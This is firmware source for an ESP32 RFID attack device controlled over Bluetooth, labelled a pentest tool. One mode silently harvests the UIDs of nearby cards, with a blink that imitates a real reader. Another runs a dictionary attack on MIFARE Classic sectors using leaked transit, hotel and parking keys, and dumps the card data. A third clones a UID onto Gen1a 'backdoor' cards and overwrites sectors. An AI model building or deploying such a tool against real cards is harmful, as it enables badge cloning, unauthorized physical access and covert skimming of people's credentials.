
#include <Arduino.h>
#include <SPI.h>
#include <MFRC522.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>

// ── Pin definitions ───────────────────────────────────────────────────────────
#define SS_PIN 5
#define RST_PIN 0
#define LED_PIN 2 // Built-in LED (active HIGH on most ESP32 devboards)

// ── BLE UUIDs (Nordic UART profile) ──────────────────────────────────────────
static const char *BLE_DEVICE_NAME = "RFID-Reader";
static const char *BLE_SERVICE_UUID = "6E400001-B5A3-F393-E0A9-E50E24DCCA9E";
static const char *BLE_TX_UUID = "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"; // notify
static const char *BLE_RX_UUID = "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"; // write

// ── Key dictionary ────────────────────────────────────────────────────────────
// 20 most common weak/default MIFARE Classic keys — all publicly documented in
// Proxmark3 community, NXP app notes, and academic security papers.
#define KEY_COUNT 20
static byte keyDict[KEY_COUNT][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // NXP factory default
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // All-zeros
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}, // MAD (MIFARE Application Directory)
    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5}, // Common vendor default
    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7}, // NDEF (NFC Forum standard)
    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD}, // Leaked — access-control vendors
    {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A}, // Leaked — transit cards
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}, // Sequential pattern
    {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97}, // Leaked — parking systems
    {0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F}, // Leaked — hotel key systems
    {0xA0, 0x47, 0x8C, 0xC3, 0x90, 0x91}, // Vendor-specific (gyms/academies)
    {0x53, 0x3C, 0xB6, 0xC7, 0x23, 0xF6}, // Vendor-specific
    {0x8F, 0xD0, 0xA4, 0xF2, 0x56, 0xE9}, // Vendor-specific
    {0x00, 0x00, 0x14, 0x4B, 0x5C, 0x31}, // Low-entropy key
    {0xB5, 0x78, 0xF3, 0x8A, 0x5C, 0x61}, // Leaked
    {0x96, 0xA3, 0x01, 0xBC, 0xE2, 0x67}, // Leaked
    {0x4B, 0x79, 0x1E, 0x4D, 0x5A, 0xEC}, // Leaked
    {0x2A, 0x2C, 0x13, 0xCC, 0x24, 0x2A}, // Palindrome
    {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC}, // Sequential
    {0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56}, // Sequential
};

// ── State machine ─────────────────────────────────────────────────────────────
enum class AppMode
{
  IDLE,
  HARVEST,
  AUDIT,
  WRITE
};
static AppMode currentMode = AppMode::IDLE;

// Audit results — cached per session, used by WRITE fallback
struct SectorResult
{
  bool scanned = false;
  bool vulnA = false;
  bool vulnB = false;
  byte keyA[6] = {};
  byte keyB[6] = {};
};
static SectorResult auditResults[16];
static bool hasAuditResults = false;

// WRITE mode target
static byte targetUid[10];
static byte targetUidSize = 0;

// IDLE/HARVEST dedup
static byte lastUid[10];
static byte lastUidSize = 0;

// ── BLE handles ───────────────────────────────────────────────────────────────
static MFRC522 rfid(SS_PIN, RST_PIN);
static BLEServer *bleServer = nullptr;
static BLECharacteristic *bleTxCharacteristic = nullptr;
static bool bleDeviceConnected = false;

// ── Utility ───────────────────────────────────────────────────────────────────
static void bleSend(const String &msg)
{
  if (bleDeviceConnected && bleTxCharacteristic)
  {
    bleTxCharacteristic->setValue(msg.c_str());
    bleTxCharacteristic->notify();
    delay(20); // Give BLE stack time to flush before next notify
  }
  Serial.println(msg);
}

static String uidToHex(const byte *uid, byte size)
{
  String s;
  s.reserve(size * 3);
  for (byte i = 0; i < size; i++)
  {
    if (i)
      s += ':';
    char buf[3];
    snprintf(buf, sizeof(buf), "%02X", uid[i]);
    s += buf;
  }
  return s;
}

static String keyToHex(const byte *k)
{
  char buf[13];
  snprintf(buf, sizeof(buf), "%02X%02X%02X%02X%02X%02X",
           k[0], k[1], k[2], k[3], k[4], k[5]);
  return String(buf);
}

static String blockToHex(const byte *data, byte len)
{
  String s;
  s.reserve(len * 3);
  for (byte i = 0; i < len; i++)
  {
    if (i)
      s += ' ';
    char buf[3];
    snprintf(buf, sizeof(buf), "%02X", data[i]);
    s += buf;
  }
  return s;
}

static bool isNewUID(const byte *a, byte aLen, const byte *b, byte bLen)
{
  if (aLen != bLen)
    return true;
  for (byte i = 0; i < aLen; i++)
    if (a[i] != b[i])
      return true;
  return false;
}

static bool parseUidHex(const String &hex, byte *out, byte &outSize)
{
  outSize = 0;
  int start = 0;
  while (start < (int)hex.length() && outSize < 10)
  {
    int colon = hex.indexOf(':', start);
    String b = (colon == -1) ? hex.substring(start) : hex.substring(start, colon);
    b.trim();
    if (b.length() != 2)
      return false;
    out[outSize++] = (byte)strtol(b.c_str(), nullptr, 16);
    if (colon == -1)
      break;
    start = colon + 1;
  }
  return outSize > 0;
}

// Halt + re-select card (needed between failed auth attempts)
static bool reselectCard()
{
  rfid.PCD_StopCrypto1();
  rfid.PICC_HaltA();
  delay(8);
  return rfid.PICC_IsNewCardPresent() && rfid.PICC_ReadCardSerial();
}

// ── LED helpers ───────────────────────────────────────────────────────────────
static void ledBlink(int n, int onMs = 60, int offMs = 80)
{
  for (int i = 0; i < n; i++)
  {
    digitalWrite(LED_PIN, HIGH);
    delay(onMs);
    digitalWrite(LED_PIN, LOW);
    if (i < n - 1)
      delay(offMs);
  }
}

// ── HARVEST mode ──────────────────────────────────────────────────────────────
static void handleHarvest()
{
  byte *uid = rfid.uid.uidByte;
  byte sz = rfid.uid.size;
  MFRC522::PICC_Type t = rfid.PICC_GetType(rfid.uid.sak);

  ledBlink(1, 25); // Mimic real reader blink — brief, non-alarming

  if (isNewUID(uid, sz, lastUid, lastUidSize))
  {
    lastUidSize = sz;
    memcpy(lastUid, uid, sz);

    String msg = "[HARVEST] ";
    msg += uidToHex(uid, sz);
    msg += ':';
    msg += rfid.PICC_GetTypeName(t);
    bleSend(msg);
  }

  rfid.PICC_HaltA();
  rfid.PCD_StopCrypto1();
}

// ── AUDIT mode — dictionary key attack ───────────────────────────────────────
static void handleAudit()
{
  byte *uid = rfid.uid.uidByte;
  byte sz = rfid.uid.size;
  MFRC522::PICC_Type t = rfid.PICC_GetType(rfid.uid.sak);

  bool isClassic = (t == MFRC522::PICC_TYPE_MIFARE_MINI ||
                    t == MFRC522::PICC_TYPE_MIFARE_1K ||
                    t == MFRC522::PICC_TYPE_MIFARE_4K);

  {
    String s = "[AUDIT] START:";
    s += uidToHex(uid, sz);
    s += ':';
    s += rfid.PICC_GetTypeName(t);
    bleSend(s);
  }

  if (!isClassic)
  {
    bleSend("[AUDIT] FAIL:Not MIFARE Classic");
    rfid.PICC_HaltA();
    rfid.PCD_StopCrypto1();
    currentMode = AppMode::IDLE;
    return;
  }

  memset(auditResults, 0, sizeof(auditResults));
  hasAuditResults = false;

  // 1K = 16 sectors, Mini = 5, 4K = 40 (simplified: cap at 16 for RC522 demo)
  byte numSectors = (t == MFRC522::PICC_TYPE_MIFARE_4K) ? 16 : // RC522 reliable up to 16 on 4K
                        (t == MFRC522::PICC_TYPE_MIFARE_MINI) ? 5
                                                              : 16;

  for (byte sector = 0; sector < numSectors; sector++)
  {
    byte trailerBlock = sector * 4 + 3;
    byte firstBlock = sector * 4;

    // ── Try Key A ────────────────────────────────────────────────────────────
    for (byte ki = 0; ki < KEY_COUNT && !auditResults[sector].vulnA; ki++)
    {
      MFRC522::MIFARE_Key key;
      memcpy(key.keyByte, keyDict[ki], 6);

      if (rfid.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A,
                                trailerBlock, &key, &rfid.uid) == MFRC522::STATUS_OK)
      {
        auditResults[sector].vulnA = true;
        memcpy(auditResults[sector].keyA, keyDict[ki], 6);

        // Dump data blocks
        for (byte blk = firstBlock; blk < trailerBlock; blk++)
        {
          byte data[18];
          byte dLen = sizeof(data);
          if (rfid.MIFARE_Read(blk, data, &dLen) == MFRC522::STATUS_OK)
          {
            String d = "[AUDIT] S";
            d += sector;
            d += ":DATA:B";
            d += blk;
            d += ':';
            d += blockToHex(data, 16);
            bleSend(d);
          }
        }
        rfid.PCD_StopCrypto1();
      }
      else
      {
        if (!reselectCard())
        {
          bleSend("[AUDIT] ABORT:Card removed");
          currentMode = AppMode::IDLE;
          return;
        }
      }
    }

    // ── Try Key B ────────────────────────────────────────────────────────────
    for (byte ki = 0; ki < KEY_COUNT && !auditResults[sector].vulnB; ki++)
    {
      MFRC522::MIFARE_Key key;
      memcpy(key.keyByte, keyDict[ki], 6);

      if (rfid.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_B,
                                trailerBlock, &key, &rfid.uid) == MFRC522::STATUS_OK)
      {
        auditResults[sector].vulnB = true;
        memcpy(auditResults[sector].keyB, keyDict[ki], 6);
        rfid.PCD_StopCrypto1();
      }
      else
      {
        if (!reselectCard())
        {
          bleSend("[AUDIT] ABORT:Card removed");
          currentMode = AppMode::IDLE;
          return;
        }
      }
    }

    auditResults[sector].scanned = true;

    // Send sector summary
    String r = "[AUDIT] S";
    r += sector;
    if (auditResults[sector].vulnA || auditResults[sector].vulnB)
    {
      r += ":VULN";
      if (auditResults[sector].vulnA)
      {
        r += ":KA:";
        r += keyToHex(auditResults[sector].keyA);
      }
      if (auditResults[sector].vulnB)
      {
        r += ":KB:";
        r += keyToHex(auditResults[sector].keyB);
      }
    }
    else
    {
      r += ":SECURE";
    }
    bleSend(r);
  }

  hasAuditResults = true;
  rfid.PICC_HaltA();
  rfid.PCD_StopCrypto1();
  bleSend("[AUDIT] DONE");
  currentMode = AppMode::IDLE;
}
// ──────────────────────────────────────────────────────────────
//  Gen1a backdoor — versão corrigida
// ──────────────────────────────────────────────────────────────

/** Reseta o campo RF brevemente para forçar re-energização do cartão */
void rfReset()
{
  rfid.PCD_WriteRegister(MFRC522::TxControlReg, 0x00); // RF off
  delay(10);
  rfid.PCD_WriteRegister(MFRC522::TxControlReg, 0x03); // RF on
  delay(10);
}

/**
 * Wakeup Gen1a: emite WUPA (0x52) em modo short-frame (7 bits)
 * sem alterar registradores globais do PCD.
 */
bool gen1a_wakeup()
{
  rfid.PCD_StopCrypto1();

  rfid.PCD_WriteRegister(MFRC522::TxControlReg, 0x00);
  delay(20);
  rfid.PCD_WriteRegister(MFRC522::TxControlReg, 0x03);
  delay(20);

  rfid.PCD_WriteRegister(MFRC522::BitFramingReg, 0x07);

  byte cmd = 0x52;
  byte resp[2];
  byte rLen = sizeof(resp);
  byte validBits = 7;

  MFRC522::StatusCode s = rfid.PCD_TransceiveData(
      &cmd, 1, resp, &rLen, &validBits, 0, false);

  rfid.PCD_WriteRegister(MFRC522::BitFramingReg, 0x00);

  bleSend(String("[DBG] WUPA status=") + s + " rLen=" + rLen);

  return (rLen == 2); // ← ATQA tem sempre 2 bytes; se chegou, cartão respondeu
}
bool gen1a_unlock()
{
  byte resp[1];
  byte rLen = 1;
  byte validBits = 7;

  // 0x40 — short frame 7 bits
  rfid.PCD_WriteRegister(MFRC522::BitFramingReg, 0x07);
  byte cmd40 = 0x40;
  MFRC522::StatusCode s = rfid.PCD_TransceiveData(
      &cmd40, 1, resp, &rLen, &validBits, 0, false);
  rfid.PCD_WriteRegister(MFRC522::BitFramingReg, 0x00);

  bleSend(String("[DBG] 0x40 status=") + s + " resp=" + (rLen > 0 ? resp[0] : 0xFF));

  // 0x3F = ACK Gen1a, mas STATUS_COLLISION também é válido aqui
  if (s != MFRC522::STATUS_OK && s != MFRC522::STATUS_COLLISION)
    return false;

  delay(1); // ← era 5ms, reduz para 1ms

  // 0x43 — full frame 8 bits, sem CRC
  rLen = 1;
  validBits = 0; // 8 bits completos
  rfid.PCD_WriteRegister(MFRC522::BitFramingReg, 0x00);
  byte cmd43 = 0x43;
  s = rfid.PCD_TransceiveData(
      &cmd43, 1, resp, &rLen, &validBits, 0, false);

  bleSend(String("[DBG] 0x43 status=") + s + " resp=" + (rLen > 0 ? resp[0] : 0xFF));

  // Aceita OK ou COLLISION ou mesmo timeout — Gen1a às vezes não responde ao 0x43
  return (s == MFRC522::STATUS_OK || s == MFRC522::STATUS_COLLISION || s == MFRC522::STATUS_TIMEOUT);
}
/**
 * Escrita direta em bloco após unlock Gen1a.
 * Fase 1: 0xA0 + blockAddr + CRC  → ACK
 * Fase 2: 16 bytes + CRC           → ACK
 */
bool gen1a_writeBlock(byte blockAddr, byte *data16)
{
  byte resp[1];
  byte rLen = 1;

  // Fase 1 — comando de escrita com CRC
  byte frame[4];
  frame[0] = 0xA0;
  frame[1] = blockAddr;
  rfid.PCD_CalculateCRC(frame, 2, &frame[2]);

  MFRC522::StatusCode s = rfid.PCD_TransceiveData(
      frame, 4, resp, &rLen, nullptr, 0, false);
  if (s != MFRC522::STATUS_OK && s != MFRC522::STATUS_COLLISION)
  {
    bleSend("[DBG] Gen1a: write cmd NAK");
    return false;
  }
  delay(2);

  // Fase 2 — dados + CRC
  byte payload[18];
  memcpy(payload, data16, 16);
  rfid.PCD_CalculateCRC(payload, 16, &payload[16]);

  rLen = 1;
  s = rfid.PCD_TransceiveData(
      payload, 18, resp, &rLen, nullptr, 0, false);
  if (s != MFRC522::STATUS_OK && s != MFRC522::STATUS_COLLISION)
  {
    bleSend("[DBG] Gen1a: data NAK");
    return false;
  }
  return true;
}
void buildBlock0(byte *uid4, byte *out16)
{
  memset(out16, 0x00, 16);
  out16[0] = uid4[0];
  out16[1] = uid4[1];
  out16[2] = uid4[2];
  out16[3] = uid4[3];
  out16[4] = uid4[0] ^ uid4[1] ^ uid4[2] ^ uid4[3]; // BCC
  out16[5] = 0x08;                                  // SAK — Classic 1K
  out16[6] = 0x04;                                  // ATQA lo
  out16[7] = 0x00;                                  // ATQA hi
}

byte writeFallbackSectors()
{
  if (!hasAuditResults)
  {
    bleSend("[WRITE_MODE] FALLBACK:SKIP:Run AUDIT first");
    return 0;
  }

  byte written = 0;
  for (byte sector = 1; sector < 16; sector++)
  {
    if (!auditResults[sector].vulnA && !auditResults[sector].vulnB)
      continue;
    if (!reselectCard())
      break;

    MFRC522::MIFARE_Key key;
    byte authCmd;
    if (auditResults[sector].vulnA)
    {
      memcpy(key.keyByte, auditResults[sector].keyA, 6);
      authCmd = MFRC522::PICC_CMD_MF_AUTH_KEY_A;
    }
    else
    {
      memcpy(key.keyByte, auditResults[sector].keyB, 6);
      authCmd = MFRC522::PICC_CMD_MF_AUTH_KEY_B;
    }

    byte trailerBlock = sector * 4 + 3;
    if (rfid.PCD_Authenticate(authCmd, trailerBlock, &key, &rfid.uid) != MFRC522::STATUS_OK)
    {
      rfid.PCD_StopCrypto1();
      continue;
    }

    byte payload[16] = {0};
    memcpy(payload, targetUid, min((int)targetUidSize, 4));
    payload[4] = 0xDE;
    payload[5] = 0xAD;
    payload[6] = 0xBE;
    payload[7] = 0xEF;

    byte dataBlock = sector * 4;
    if (rfid.MIFARE_Write(dataBlock, payload, 16) == MFRC522::STATUS_OK)
    {
      String m = "[WRITE_MODE] FALLBACK:S";
      m += sector;
      m += ":WRITTEN";
      bleSend(m);
      written++;
    }
    rfid.PCD_StopCrypto1();
  }
  return written;
}
// ──────────────────────────────────────────────────────────────
//  handleWrite corrigido
// ──────────────────────────────────────────────────────────────
static void handleWrite()
{
  if (targetUidSize != 4)
  {
    bleSend("[WRITE_MODE] FAIL:Only 4-byte UID supported");
    return;
  }

  // Para crypto mas NÃO faz halt nem corta RF aqui
  rfid.PCD_StopCrypto1();
  delay(30);

  bool uidCloned = false;

  if (gen1a_wakeup())
  {
    bleSend("[DBG] Gen1a: wakeup OK");
    if (gen1a_unlock())
    {
      bleSend("[DBG] Gen1a: unlock OK");
      byte block0[16];
      buildBlock0(targetUid, block0);
      if (gen1a_writeBlock(0, block0))
      {
        String ok = "[WRITE_MODE] UID_CLONED:";
        ok += uidToHex(targetUid, targetUidSize);
        bleSend(ok);
        uidCloned = true;
      }
    }
  }
  else
  {
    bleSend("[DBG] Gen1a: wakeup FAIL");
  }

  rfid.PICC_HaltA();
  rfid.PCD_StopCrypto1();
  delay(30);

  bool cardBack = reselectCard();
  if (!cardBack)
  {
    rfReset();
    delay(20);
    cardBack = reselectCard();
  }

  if (!cardBack)
  {
    bleSend("[WRITE_MODE] FAIL:Card lost after UID phase");
    currentMode = AppMode::IDLE;
    bleSend("[WRITE_MODE] EXIT");
    return;
  }

  bleSend("[WRITE_MODE] FALLBACK:Starting data-sector write");
  byte written = writeFallbackSectors();

  rfid.PICC_HaltA();
  rfid.PCD_StopCrypto1();

  if (!uidCloned && written == 0)
  {
    bleSend("[WRITE_MODE] FAIL:UID immutable and no writable sectors found");
  }
  else
  {
    if (uidCloned)
      bleSend("[WRITE_MODE] RESULT:UID cloned via Gen1a backdoor");
    if (written > 0)
    {
      String s = "[WRITE_MODE] RESULT:";
      s += written;
      s += " data sectors written";
      bleSend(s);
    }
  }

  currentMode = AppMode::IDLE;
  bleSend("[WRITE_MODE] EXIT");
}

// ── BLE RX callback ───────────────────────────────────────────────────────────
class RxCallbacks : public BLECharacteristicCallbacks
{
  void onWrite(BLECharacteristic *pChar) override
  {
    String val = String(pChar->getValue().c_str());
    val.trim();
    Serial.print(F("[BLE RX] "));
    Serial.println(val);

    if (val == "HARVEST")
    {
      currentMode = AppMode::HARVEST;
      memset(lastUid, 0, sizeof(lastUid));
      lastUidSize = 0;
      bleSend("[HARVEST] ACTIVE");
    }
    else if (val == "AUDIT")
    {
      currentMode = AppMode::AUDIT;
      bleSend("[AUDIT] WAITING");
    }
    else if (val.startsWith("WRITE:"))
    {
      if (parseUidHex(val.substring(6), targetUid, targetUidSize))
      {
        currentMode = AppMode::WRITE;
        String m = "[WRITE_MODE] Ready:";
        m += uidToHex(targetUid, targetUidSize);
        bleSend(m);
      }
      else
      {
        bleSend("[WRITE_MODE] FAIL:Bad UID format");
      }
    }
    else if (val == "CANCEL")
    {
      currentMode = AppMode::IDLE;
      rfid.PICC_HaltA();
      rfid.PCD_StopCrypto1();
      bleSend("[MODE] IDLE");
    }
  }
};

// ── BLE server callbacks ───────────────────────────────────────────────────────
class ServerCallbacks : public BLEServerCallbacks
{
  void onConnect(BLEServer *) override
  {
    bleDeviceConnected = true;
    Serial.println(F("[BLE] Connected"));
  }
  void onDisconnect(BLEServer *) override
  {
    bleDeviceConnected = false;
    currentMode = AppMode::IDLE;
    Serial.println(F("[BLE] Disconnected — restarting advertising"));
    BLEDevice::startAdvertising();
  }
};

// ── BLE setup ─────────────────────────────────────────────────────────────────
static void setupBle()
{
  BLEDevice::init(BLE_DEVICE_NAME);
  bleServer = BLEDevice::createServer();
  bleServer->setCallbacks(new ServerCallbacks());

  BLEService *svc = bleServer->createService(BLE_SERVICE_UUID);

  bleTxCharacteristic = svc->createCharacteristic(
      BLE_TX_UUID, BLECharacteristic::PROPERTY_NOTIFY | BLECharacteristic::PROPERTY_READ);
  bleTxCharacteristic->addDescriptor(new BLE2902());
  bleTxCharacteristic->setValue("Ready");

  BLECharacteristic *rxChar = svc->createCharacteristic(
      BLE_RX_UUID, BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_WRITE_NR);
  rxChar->setCallbacks(new RxCallbacks());

  svc->start();

  BLEAdvertising *adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(BLE_SERVICE_UUID);
  adv->setScanResponse(true);
  adv->setMinPreferred(0x06);
  adv->setMinPreferred(0x12);
  BLEDevice::startAdvertising();
}

// ── Arduino lifecycle ──────────────────────────────────────────────────────────
void setup()
{
  Serial.begin(9600);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  delay(100);

  setupBle();
  SPI.begin(18, 19, 23, SS_PIN);
  rfid.PCD_Init();

  Serial.print(F("RC522 firmware: 0x"));
  Serial.println(rfid.PCD_ReadRegister(rfid.VersionReg), HEX);
  Serial.println(F("=== RFID Pentest Device Ready ==="));

  ledBlink(3, 100, 100); // Boot OK indicator
}

void loop()
{
  if (!rfid.PICC_IsNewCardPresent() || !rfid.PICC_ReadCardSerial())
    return;

  switch (currentMode)
  {
  case AppMode::HARVEST:
    handleHarvest();
    break;
  case AppMode::AUDIT:
    handleAudit();
    break;
  case AppMode::WRITE:
    handleWrite();
    break;
  default:
  {
    // IDLE — same as before
    byte *uid = rfid.uid.uidByte;
    byte sz = rfid.uid.size;
    MFRC522::PICC_Type t = rfid.PICC_GetType(rfid.uid.sak);
    if (isNewUID(uid, sz, lastUid, lastUidSize))
    {
      lastUidSize = sz;
      memcpy(lastUid, uid, sz);
      String m;
      m += '[';
      m += millis();
      m += F("ms] ");
      m += rfid.PICC_GetTypeName(t);
      m += ':';
      m += uidToHex(uid, sz);
      m += F(" [NEW]");
      bleSend(m);
    }
    rfid.PICC_HaltA();
    rfid.PCD_StopCrypto1();
    break;
  }
  }
}